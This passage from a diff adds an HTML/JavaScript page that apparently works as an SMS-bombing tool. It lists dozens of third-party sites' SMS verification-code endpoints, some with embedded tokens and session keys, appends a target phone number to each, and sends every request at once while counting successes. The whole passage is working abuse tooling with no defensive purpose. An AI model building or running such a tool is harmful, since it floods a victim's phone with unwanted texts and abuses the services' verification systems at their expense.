+                "http://api.ilukuang.com/trafficradio/speedCamera/acquirePhoneCheckCode.action?userName=ff82e5376c915c94e66808f99d74855c187e2978&openUDID=ff82e5376c915c94e66808f99d74855c187e2978&clientType=1&version=1098&softVersion=328&versionStyle=3&lon=121.169789&lat=28.876707&sysID=8298380&resolution=640_1136&OSVersion=8.1&channelName=AppStore&&source=028fa5cddf7e5130dfd35344299ffbba&authCodeType=register&basicCheck=0&phone=",
+                "http://api.qingchifan.com/api/passport/phone/getAuthCode.json?access_token=028fa5cddf7e5130dfd35344299ffbba&phone=",
+                "http://api.ele.me/send_validation_code/login/sms?consumer_key=7284397383&session_id=5cf5aefac98b75a15fb086fbde8342b8&sig=8e868b3511253feb27e1ea64ed30618d&timestamp=1432191567&track_id=1432191548%7C_e0bc8840-ff86-11e4-ade2-ecb1d785b898%7C03ca5db5d2c9d285423c19ba2454a312&mobile=",
+                "http://www.88mmmoney.com/mm_reg_Sms.shtml?licence=4943&fcode=&j_password=951623&_phone=",
+                "https://e.wy-fund.com/wysale/customer/getSecurityCode?phone=",
+                "https://secure.elong.com/passport/isajax/Register/GetDynamicCode?language=cn&viewpath=~/views/myelong/passport/Register.aspx&rnd=20150501211116316&mobile=",
+                "https://reg.suning.com/ajax/code/sms.do?scen=PERSON_MOBILE_REG_VERIFY_MOBILE&phoneNum=",
+                "http://user.juanpi.com/public/getRegisterCode?myphone=",
+                "https://account.fund123.cn/login/Register/checkmobile.ashx?phone=",
+                "http://www.mkf.com/Users/msg.html?code=6yvcd&type=1&operate=1&mobile=",
+                "http://www.demo.pigcms.cn/index.php?m=Users&a=sendMsg&mp=",
+                "http://es.xiaojukeji.com/Auth/sendCode?phone=",
+                "https://m.zhangle.com/openAccount/servlet/json?TFrom=thinkive&funcNo=501801&mobileNo=",
+                "http://www.51taoshi.com/user/login/sendSms.action?token=1P7D4738ABBH35PA19437RBHPCA97CSS&mobile=",
+                "http://www.dumex.com.cn/member/member_queryWebValidCode.action?checkPicCode=t7x2&phone=",
+                "https://member.wanlitong.com/otp/sendOtpDynamicCode.do?vCodeValue=gtz9&functionContext=REGWLT&vCodeKey=1430460266265&sendType=01&mobile=",
+                "https://passport.9you.com/sendmobilecode.php?type=regist&dataType=json&checkcode=jmyz&mobile=",
+                "http://www.sfheike.com/fg/user/ajax/user.do?actionType=checkreguser&virifyType=mobile&ranNum=0.6977603682108986&virifyValue=",
+                "https://member.zhangle.com/witness/openOnline.do?sendMessageNum=20&method=sendMsgForMobile&telphone=",
+                "https://account.koudai.com/sendVerificationCode.do?userId=&code=&password=&passwordAgain=&validCode=&type=find&phoneNum=",
+                "https://login.zhongmin.cn/AshxFile/RegisterRandCode.ashx?mobilephone=",
+                "http://www.douban.com/accounts/j/register/send_register_verify_code?phone=",
+                "https://www.zrcaifu.com/register-send-code?phone=",
+                "https://www.yilucaifu.com/sms/sendRegVali.html?r=0.9147440722636582&mobiletelno=",
+                "http://mobile.kaixin001.com/kxmobile/wap_do.php?bind=0&step=1&mobile=",
+                "http://mobile.kaixin001.com/kxmobile/aj_download_sms.php?app=kaixin&mobile=",
+                "http://voice.guoling.com/index.php/sms_send/send_sms?code=6267&phone=",
+                "https://platform.lfex.com/lfex_web/acc/fo/vercode/mobileVercode?telephone=",
+                "https://passport.meituan.com/account/checksignup?mobile=",
+                "http://www.4000096176.com/zhiyou/index.php/message_send?rand=0.14558584631230803&message_to=",
+                "http://www.qufenqi.com/verifycode?action=1&code=&mobile=",
+                "http://www.mcds.com/index.php/User-sendverify.htm?verify_reg=6b3839df8c8f203151dbc442e9134980&trend_num=",
+                "http://www.fapai.com/account/sendcodebyregister?userName=",
+                "http://topic.hongxiu.com/wap/action.aspx?hidtype=1&txtMobile=",
+                "http://e.vmall.com/login/userreg/0/send7et?validateCode=&msgCode=&loginUser.loginPassword=&loginUser.loginMobile=",
+                "http://www.99kzc.com/Ajax/Customer/CheckCustomerInfo.php?mobile=",
+                "http://www.99kzc.com/Ajax/Customer/SendSMS.php?mobile=",
+                "http://www.hcmlin.com/ajax.php?a=check_tel&name=phone?m=",
+                "http://www.hcmlin.com/plugins/sms/sendsms.php?a=checkcode&mobile=",
+                "http://www.icarzoo.com/register_login/check_mobile?mobile=",
+                "http://www.91money.com/common/sms/sendcheck?send_type=1&mobile=",
+                "http://www.moko.cc/register%7CsendCheckPhone.action?uuid=dbcaa508-b0f2-4668-bb59-c8a3f7f056a8&phone=",
+                "http://passport.jumei.com/i/account/check_mobile?mobile=",
+                "http://rlq1969.kuailian.me/tools/submit_ajax.ashx?action=user_register_smscode&mobile=",
+                "https://www.tuandai.com/ajaxCross/Reg.ashx?Cmd=GetVoiceVerifyCode&mobile=",
+                "https://passport.coocaa.com/helper/send-mobile-valid?mtk2=520310122934ed8deeb22c3b0dff59d0&mtk=787912&mobile=",
+                "http://www.atsws.com/sms/index?phone=",
+                "https://member.cpic.com.cn/ucf/checkUserInfo/checkMobile?timestamp=1420901976948&mobile=",
+                "http://pr.mangocity.com/sendSms.php?mobile=",
+                "http://www.id68.cn/member/common/ckuser/?UserName=",
+                "http://passport.hupu.com/index.php?m=mobile&a=isMobile&format=ajax&mobile=",
+                "http://www.qinliancf.com/member/reg/send/sms/code.html?reg_mobile=",
+                "http://shop.tcl.com/register/sendcode.html?verify_type=register&telephone=",
+                "http://8.9fbank.com/checkMobile.html?mobile=",
+                "http://www.touchu.cn/Ajax/ExistPhone.ashx?pwd=&comformpwd=&code=&Agreement=checked&tokenCNM=78r9ewhjskahfdis6f8dsahfdjs&txtUnionUser=&username=%E8%AF%B7%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%2F%E6%89%8B%E6%9C%BA%E5%8F%B7%2F%E9%82%AE%E7%AE%B1&userpwd=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%",
+                "http://www.tonghuafund.com/company/ajaxObtainPersonPhoneVeryCode.action?mobileNum=",
+                "http://beijing.scar.com.cn/inc/ac_sendsmscode.asp?usertel=",
+                "http://shop.zjhtc.com/jspgou/regedit/SendCode.jspx?date=Fri+Jan+2+17%3A40%3A57+UTC%2B0800+2015&mobile=",
+                "http://t.zhaicuoben.com/role/VerifyAction.a?phoneExist&phone=",
+                "http://login.shangpin.com/login/ValidMobileRegRepeat?v=0.028403034062114307&mobile=",
+                "http://www.t1678.com/index.php?m=login.send_pcode&ajax=1&tel=",
+                "http://passport.dodomoney.com/register/getvalidatecode&register=1&mobile=",
+                "http://i.kaopuyun.com/msg/chkPhone.do?phone=",
+                "http://www.baojia.com/Home-User-register/?referral=&isnew=1&abc=2&mobile=",
+                "http://www.atsws.com/sms/index?phone=",
+                "http://passport2.pchouse.com.cn/passport2/api/sendVerificationCode.jsp?vCodeKey=a91ce0be93cf15dbf714c10c991a7421&VCodeTime=1420193390666&%7B%7D=&windowname=true&mobile=",
+                "http://reg.shenghuo.com/register/_sendMsg?phonenum=",
+                "http://bbs.wangdaizhijia.com/api/app/json.php?type=sms_verify_wap&csrf_test_name=&cellphone_number=",
+                "http://www.huijinxin.com/SendRegisterValidation?phone=",
+                "http://www.sfbuy.com/account/sendVcodeMsg?mobile=",
+                "http://m.qinqinbaby.com/home/passport/sendSmsCode?mobile=",
+                "http://www.wacai.com/finance/regist_sms.action?mob=",
+                "http://www.i9tou.com/PtlVCode!apply.action?nosession=true&tel=",
+                "http://m.sto.cn/Ali/index.php?s=/home/Main/get_mobile_code?mobileNo=",
+                "http://passport.capitaland.com.cn/handles/ValiDatePhone.ashx?returnUrl=&vip_mall_id=0&action=GetRetister_Code&phone_num=",
+                "http://account.tongbanjie.com/wap/register/sendverificationcode.json?phone="
+            ];
+            
+            // 处理用户接口模板：替换占位符（手机号、时间戳、随机数）
+            const processedUserApis = userApiTemplates.map(template => {
+                // 替换手机号（适配不同参数名：phone/phoneNumber/mobile/MBL_NO等）
+                let apiUrl = template.includes('{phone}') 
+                    ? template.replace('{phone}', phone) 
+                    : template + phone;
+                
+                // 替换时间戳和随机数
+                apiUrl = apiUrl
+                    .replace(/{timeStamp}/g, getTimeStamp())
+                    .replace(/{random}/g, getRandom());
+                
+                return {
+                    url: apiUrl,
+                    method: 'GET', // 多数公开接口为GET请求
+                    headers: { 'Content-Type': 'application/json' }
+                };
+            });
+            
+            // 合并接口：领克接口 + 处理后的用户接口
+            const apis = [lynkcoApi, ...processedUserApis];
+            
+            // 使用Promise.all发送所有请求
+            try {
+                const results = await Promise.all(apis.map(api => sendRequest(api)));
+                addStatusMessage('本轮接口请求已全部发送', 'success');
+            } catch (error) {
+                addStatusMessage(`发送过程中出现错误: ${error.message}`, 'error');
+            }
+        }
+        
+        // 发送单个请求
+        async function sendRequest(api) {
+            try {
+                const response = await fetch(api.url, {
+                    method: api.method,
+                    headers: api.headers
+                });
+                
+                // 尝试解析响应，忽略非JSON格式
+                let result = {};
+                try {
+                    result = await response.json();
+                } catch (e) {}
+                
+                addStatusMessage(`请求 ${api.url} 成功`, 'success');
+                successCount++;
+                document.getElementById('successCount').textContent = successCount;
+                return result;
+            } catch (error) {
+                addStatusMessage(`请求 ${api.url} 失败: ${error.message}`, 'error');
+                errorCount++;
+                document.getElementById('errorCount').textContent = errorCount;
+                throw error;
+            }
+        }
+    </script>
+</body>
+  </html>
